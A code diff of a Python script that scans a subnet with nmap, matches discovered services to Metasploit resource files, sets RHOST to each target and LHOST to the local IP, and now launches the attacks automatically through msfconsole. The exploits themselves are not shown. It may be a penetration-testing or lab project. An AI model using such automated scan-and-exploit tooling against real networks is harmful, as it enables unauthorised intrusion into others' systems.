@@ -11,6 +11,7 @@
 import netifaces as ni
 import nmap
 import os
+import subprocess
 import sys
 
 # Performs a scan on a given subnet.
@@ -37,7 +38,6 @@ def scan(subnet):
     #print and track live hosts#
     if nm[host].state() == 'up':
       print "FOUND LIVE HOST: " + host
-      print nm[host]
       host_info[host] = []
 
       #list all service info#
@@ -66,12 +66,12 @@ def deploy_attack(attack_file, target_ip):
 
 	for line in f:
 
-		if line.contains("set"):
+		if ("set" in line) or ("SET" in line) :
 
-			if line.contains("RHOST"):
-				line = "set RHOST "+target_ip+"/n"
-			elif line.contains("LHOST"):
-				line = "set LHOST "+my_ip+"/n"
+			if "RHOST" in line:
+				line = "set RHOST "+target_ip+"\n"
+			elif "LHOST" in line:
+				line = "set LHOST "+my_ip+"\n"
 		temp.write(line)
 
 	f.close()
@@ -87,6 +87,10 @@ def deploy_attack(attack_file, target_ip):
 	f.close()
 	temp.close()
 	os.remove(attack_file+".tmp")
+
+	#deploy attack#
+	subprocess.call(["msfconsole", "-r", attack_file])
+
 
 #Given a dictionary of python-nmap scan results#
 #Iterate through all .rc files in the attacks/ #
@@ -107,8 +111,13 @@ def attack(scan_info):
 			if(os.path.isdir(path)):
 
 				#get .rc files from directory#
-				attack_files = [ f for f in os.listdir(path) if (os.path.isfile(str.join(path,f)) and (".rc" in f))]
-				print('Found %i matching attacks for service" %s' % len(attack_files) , name)
+				attack_files = []
+
+				for f in os.listdir(path):
+					if os.path.isfile(path+f) and (".rc" in f):
+						attack_files.append(path+f)
+
+				print('Found ' + str(len(attack_files)) + ' matching attacks for service ' + name)
 
 				#call helper func to deploy attacks#
 				for f in attack_files:
